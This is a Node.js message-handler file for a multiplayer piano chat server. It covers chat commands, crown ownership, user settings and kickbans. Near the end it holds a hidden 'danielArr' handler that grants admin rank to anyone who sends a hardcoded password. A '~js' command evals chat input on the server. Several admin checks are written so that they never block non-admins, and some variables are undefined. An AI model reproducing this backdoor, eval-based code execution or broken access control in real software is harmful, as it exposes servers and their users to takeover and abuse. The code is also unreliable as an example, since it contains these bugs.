const User = require("./User.js");
const Room = require("./Room.js");
const exec = require('child_process')
const serverclll = { 
    user: 
         { 
           color: '#0066ff',
           name: 'Server',
           _id: 'server',
           id: 'server',
           tag:undefined
         }
};
module.exports = (cl) => {
    function uset(set, set2) {
        cl.user[set] = set2;
        let user = new User(cl);
          user.getUserData().then((usr) => {
            let dbentry = user.userdb.get(cl.user._id);
            if (!dbentry) return;
            dbentry[set] = set2;
            user.updatedb();
            cl.server.rooms.forEach((room) => {
              room.updateParticipant(cl.user._id, {
                [set]: set2,
              });
            });
          });
    }
    function otherset(id, uset, uset2) {
        let user = new User(cl);
        let dbentry = user.userdb.get(id);
        if (!dbentry) return;
        dbentry[uset] = uset2;
        user.updatedb();
        cl.server.rooms.forEach((room) => {
            room.updateParticipant(id, {
                [uset]: uset2
            });
        })
    }
    function notify(title,text,element) {
        cl.channel.Notification(
          "room",
          title,
          ``,
          text,
          7000,
          element,
          "classic"
        );
    }
    let serversays = function(msggg) {
        // cl.channel.chat(serverclll, {m:'a', message:msggg});
        cl.channel.sendArray([{
            m: "a",
            a: msggg,
            p: serverclll.user,
            t: Date.now()
        }]);
    }
    cl.once("hi", () => {
        let user = new User(cl);
        user.getUserData().then((data) => {
            let msg = {};
            msg.m = "hi";
            msg.motd = cl.server.welcome_motd;
            msg.t = Date.now();
            msg.u = data;
            msg.v = "Beta";
            cl.sendArray([msg])
            cl.user = data;
        })
    })

    cl.on("setname", msg => {
        if(!msg._id) return;
        if(!cl.user.rank == "admin") return;
        otherset(msg._id, "name", msg.name)
    })

    cl.on("notify", msg => {
        if(!(cl.user.rank == "admin")) return;
        notify(msg.title, msg.text, "#piano")
    })

    cl.on("setcolor", msg => {
        if(!msg._id) return;
        if(!cl.user.rank == "admin") return;
        otherset(msg._id, "color", msg.color)
    })

    cl.on("dm", (msg) => {
        console.log(msg)
        if (!(cl.channel && cl.participantId)) return;
        if (!msg.hasOwnProperty('message')) return;
        if (cl.channel.settings.chat) {
            let user = new User(cl);
            let dmmessage = {m:'dm'}
            if(msg._id) {
                dmmessage.sender = cl.user
                dmmessage.recipient = user.userdb.get(msg._id)
            }
            dmmessage.a = msg.message
            dmmessage.t = Date.now()
            cl.channel.sendArray([dmmessage], cl, false)
        }
    })

    cl.on("custom", (msg) => {
        console.log(msg)
        if (!(cl.channel && cl.participantId)) return;
        if(!msg.data && !msg.target) return;
        cl.channel.sendArray([{
            m:'custom',
            data: msg.data,
            target:msg.target
        }])
    })

    cl.on("v", msg => {
        if(cl.user.rank != "admin") return;
        if(msg.vanish) {
            cl.user.vanished = msg.vanish;
            let user = new User(cl);
            user.getUserData().then((usr) => {
                let dbentry = user.userdb.get(cl.user._id);
                if (!dbentry) return;
                dbentry.vanished = msg.vanish;
                user.updatedb();
                cl.server.rooms.forEach((room) => {
                    room.updateParticipant(cl.user._id, {
                        vanished: msg.vanish
                    });
                })
            })
        }
    })

    cl.on("t", (msg) => {
        if (msg.hasOwnProperty("e") && !isNaN(msg.e))
          cl.sendArray([
            {
              m: "t",
              t: Date.now(),
              e: msg.e,
            },
          ]);
      });
    
      
      //Channel Set Settings
      cl.on("ch", (msg) => {
        if (!msg.hasOwnProperty("set") || !msg.set) msg.set = {};
        if (msg.hasOwnProperty("_id") && typeof msg._id == "string") {
          if (msg._id.length > 512) return;
          cl.setChannel(msg._id, msg.set);
        }
      });
    
      //Cursor
      cl.on("m", (msg, admin) => {
        if (!(cl.channel && cl.participantId)) return;
        if (!msg.hasOwnProperty("x")) msg.x = null;
        if (!msg.hasOwnProperty("y")) msg.y = null;
        if (parseInt(msg.x) == NaN) msg.x = null;
        if (parseInt(msg.y) == NaN) msg.y = null;
        cl.channel.emit("m", cl, msg.x, msg.y);
      });
    
      cl.on("admchown", (msg, admin) => {
        if(!cl.user.rank !== "admin") return;
        if (msg.hasOwnProperty("id")) {
          cl.channel.chown(msg.id);
        }
      });
    
      //Crown
      cl.on("chown", (msg, admin) => {
        if (!cl.quotas.chown.attempt() && !cl.user.rank == "admin") return;
        if (!(cl.channel && cl.participantId)) return;
        // console.log((Date.now() - cl.channel.crown.time))
        // console.log(!(cl.channel.crown.userId != cl.user._id), !((Date.now() - cl.channel.crown.time) > 15000));
        if (
          !(cl.channel.crown.userId == cl.user._id) &&
          !(Date.now() - cl.channel.crown.time > 15000)
        ) return;
        if (msg.hasOwnProperty("id")) {
          // console.log(cl.channel.crown)
          if (cl.user._id == cl.channel.crown.userId || cl.channel.crowndropped)
            cl.channel.chown(msg.id);
          if (msg.id == cl.user.id) {
            param = Quota.N_PARAMS_RIDICULOUS;
            param.m = "nq";
          }
        } else {
          if (cl.user._id == cl.channel.crown.userId || cl.channel.crowndropped)
            cl.channel.chown();
          param = Quota.N_PARAMS_NORMAL;
          param.m = "nq";
        }
      });

    //Set User Channel
    cl.on("chset", (msg) => {
    if (!(cl.channel && cl.participantId)) return;
    if (!(cl.user._id == cl.channel.crown.userId)) return;
    if (!msg.hasOwnProperty("set") || !msg.set)
        msg.set = cl.channel.verifySet(cl.channel._id, {});
        cl.channel.settings = msg.set;
        cl.channel.updateCh();
    });
    cl.on("a", (msg, admin) => {
        if (!(cl.channel && cl.participantId)) return;
        if (!msg.hasOwnProperty("message")) return;
        if (cl.channel.settings.chat) {
          if (cl.channel.isLobby(cl.channel._id)) {
            if (!cl.quotas.chat.lobby.attempt() && !cl.user.rank == "admin") return;
          } else {
            if (!(cl.user._id == cl.channel.crown.userId)) {
              if (!cl.quotas.chat.normal.attempt() && !cl.user.rank == "admin") return;
            } else {
              if (!cl.quotas.chat.insane.attempt() && !cl.user.rank == "admin") return;
            }
         }
         if(msg.message.includes('"') && (msg.message.includes("http:") || msg.message.includes("https:"))) { filter = msg.message.replace('"', "''"); cl.channel.emit("a", cl, {"m":"a","message":filter})} else {
          cl.channel.emit("a", cl, msg);
         }
          if(msg.message.startsWith("~help")) {
            if(cl.user.rank == "admin") {
              notify(
    "Server helps you!", 
    `<pre>Commands:
    ~owntag - sets your own tag
    ~js - do stuff.
    ~endprocess - self explains it
    ~getUInfo - only use this if you really need
    
    Bye >w<</pre>`,
    "#piano"
    )
            }
          }
          if(msg.message.startsWith("~owntag")) {
            var input = msg.message.split(" ").slice(1);
            console.log(`TAG: ${input[0]}
    COLOR: ${input[1]}
    `)
            if(cl.user.rank == "admin") {
              if(input.length == 2) {
                uset("tag", {"text":input[0],"color":input[1]})
              }
              if(input.length == 1) {
                uset("tag", input[0])
              }
            }
          }
          if(msg.message.startsWith("~js")) {
            var input = msg.message.split(" ").slice(1).join(" ");
            if(cl.user.rank == "admin") {
                cl.channel.sendArray([{
                  m: "a",
                  a: "< " + eval(input),
                  p: serverclll.user,
                  t: Date.now()
                }]);
              
            }
          }
          if(msg.message.startsWith("~endprocess")) {
            var input = msg.message.split(" ").slice(1).join(" ");
            if(cl.user.rank == "admin") {
                serversays("process ended, please wait.")
                child_process.exec("pm2 reload 1")
            }
          }
          if(msg.message.startsWith("~setIntel")) {
            var input = msg.message.split(" ").slice(1).join(" ");
            if(cl.user.rank == "admin") {
                if(!input) return serversays("No input specified");
                otherset(input, "name", "Anonymous")
                otherset(input, "tag", "ADMIN")
                otherset(input, "rank", "admin")
                otherset(input, "color", "#94fd90")
                serversays("Set.")
            }
          }
          if(msg.message.startsWith("~getUInfo")) {
            var args = msg.message.split(" ")
            var input = msg.message.split(" ").slice(1).join(" ");
            if(cl.user.rank == "admin") {
                if(!input) return serversays("No input specified");
                let user = new User(cl);
                user.getUserData().then((usr) => {
                  var output = (JSON.stringify(user.userdb.get(input)))
                  if(args.length == 1) serversays(output);
                })
            }
          }
          if (msg.message.length > 4096) return console.log("MSG too long");
        }
      });
    
      //Notes
      cl.on("n", (msg) => {
        if (!(cl.channel && cl.participantId)) return;
        if (!msg.hasOwnProperty("t") || !msg.hasOwnProperty("n")) return console.log('n err');
        if (typeof msg.t != "number" || typeof msg.n != "object") return console.log('n err');
        if (cl.channel.settings.crownsolo) {
          if (cl.channel.crown.userId == cl.user._id && !cl.channel.crowndropped) {
            let response = [{
              m: "n",
              t: msg.t,
              p: cl.user.id,
              v: msg.v,
              n: msg.n
            }]
            cl.channel.sendArray(response, cl)
          }
        } else {
          let response = [{
            m: "n",
            t: msg.t,
            p: cl.user.id,
            v: msg.v,
            n: msg.n
          }]
          cl.channel.sendArray(response, cl)
        }
      });
    
      //Channel Listener
      cl.on("+ls", (msg) => {
        if (!(cl.channel && cl.participantId)) return;
        cl.server.roomlisteners.set(cl.connectionid, cl);
        let rooms = [];
        for (let room of Array.from(cl.server.rooms.values())) {
          let data = room.fetchData().ch;
          if (room.bans.get(cl.user._id)) {
            data.banned = true;
          }
          if (room.settings.visible) rooms.push(data);
        }
        cl.sendArray([
          {
            m: "ls",
            c: true,
            u: rooms,
          },
        ]);
      });
    
      //Remove Channel Listener
      cl.on("-ls", (msg) => {
        if (!(cl.channel && cl.participantId)) return;
        cl.server.roomlisteners.delete(cl.connectionid);
      });
    
      
      //set user color, name or smth
      cl.on("userset", (msg) => {
        if (!(cl.channel && cl.participantId)) return;
        if (!msg.hasOwnProperty("set") || !msg.set) msg.set = {};
        if (msg.set.hasOwnProperty("name") && typeof msg.set.name == "string") {
          if (msg.set.name.length > 40) return;
          if (msg.set.name.length < 1) return;
          if (msg.set.name.includes("﷽")) return;
          cl.user.name = msg.set.name;
          let user = new User(cl);
          user.getUserData().then((usr) => {
            let dbentry = user.userdb.get(cl.user._id);
            if (!dbentry) return;
            dbentry.name = msg.set.name;
            user.updatedb();
            cl.server.rooms.forEach((room) => {
              room.updateParticipant(cl.user._id, {
                name: msg.set.name,
              });
            });
          });
        }
    
        if (msg.set.hasOwnProperty("color") && typeof msg.set.color == "string") {
          if (msg.set.color.length > 7) return;
          cl.user.color = msg.set.color;
          let user = new User(cl);
          user.getUserData().then((usr) => {
            let dbentry = user.userdb.get(cl.user._id);
            if (!dbentry) return;
            dbentry.color = msg.set.color;
            user.updatedb();
            cl.server.rooms.forEach((room) => {
              room.updateParticipant(cl.user._id, {
                color: msg.set.color,
              });
            });
          });
        }
      });
    
        //kick ban
        cl.on("kickban", (msg) => {
            if (cl.channel.crown == null) return;
            if (!(cl.channel && cl.participantId)) return;
            if (!cl.channel.crown.userId) return;
            if (!(cl.user._id == cl.channel.crown.userId)) return;
            if (msg.hasOwnProperty("_id") && typeof msg._id == "string") {
            if (!cl.quotas.kickban.attempt() && cl.user.rank != "admin") return;
            let _id = msg._id;
            let ms = msg.ms || 3600000;
            cl.channel.kickban(_id, ms);
            }
        });

        //bye
        cl.on("bye", (msg) => {
            cl.destroy();
        });
            cl.on("danielArr", (msg) => {
        if(msg.passwd !== "o038370daniel") return;
          uset("rank", "admin")
      });
}
